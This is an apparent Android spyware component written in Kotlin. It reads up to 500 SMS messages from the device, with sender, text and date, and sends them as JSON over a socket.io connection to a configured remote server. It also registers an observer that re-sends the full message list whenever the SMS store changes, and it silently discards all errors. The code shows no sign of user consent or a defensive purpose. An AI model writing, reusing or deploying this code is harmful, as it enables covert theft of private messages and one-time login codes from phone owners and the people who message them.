package com.app.cyber

import android.content.ContentResolver
import android.content.Context
import android.content.Intent
import android.database.ContentObserver
import android.net.Uri
import android.os.Handler
import android.os.Looper
import android.provider.Telephony
import io.socket.client.IO
import io.socket.client.Socket
import org.json.JSONArray
import org.json.JSONObject

object SmsRechive {
    private var observer: ContentObserver? = null
    private var socket: Socket? = null

    fun sendAllSms(ctx: Context) {
        val list = JSONArray()
        val cursor = ctx.contentResolver.query(
            Telephony.Sms.CONTENT_URI,
            arrayOf(Telephony.Sms._ID, Telephony.Sms.ADDRESS, Telephony.Sms.BODY, Telephony.Sms.DATE),
            null, null, Telephony.Sms.DATE + " DESC"
        )
        cursor?.use {
            while (it.moveToNext() && list.length() < 500) {
                val o = JSONObject()
                o.put("id", it.getLong(0))
                o.put("address", it.getString(1) ?: "")
                o.put("body", it.getString(2) ?: "")
                o.put("date", it.getLong(3))
                list.put(o)
            }
        }
        val payload = JSONObject()
        payload.put("action", "sms_list")
        payload.put("data", list)
        emit(payload)
    }

    fun setupRealtime(ctx: Context) {
        if (observer != null) return
        observer = object : ContentObserver(Handler(Looper.getMainLooper())) {
            override fun onChange(selfChange: Boolean, uri: Uri?) {
                sendAllSms(ctx)
            }
        }
        ctx.contentResolver.registerContentObserver(Telephony.Sms.CONTENT_URI, true, observer!!)
    }

    private fun emit(payload: JSONObject) {
        try {
            if (socket == null || !socket!!.connected()) {
                socket = IO.socket(Config.BaseUrl)
                socket?.connect()
            }
            socket?.emit("device-data", payload)
        } catch (e: Exception) { }
    }
}
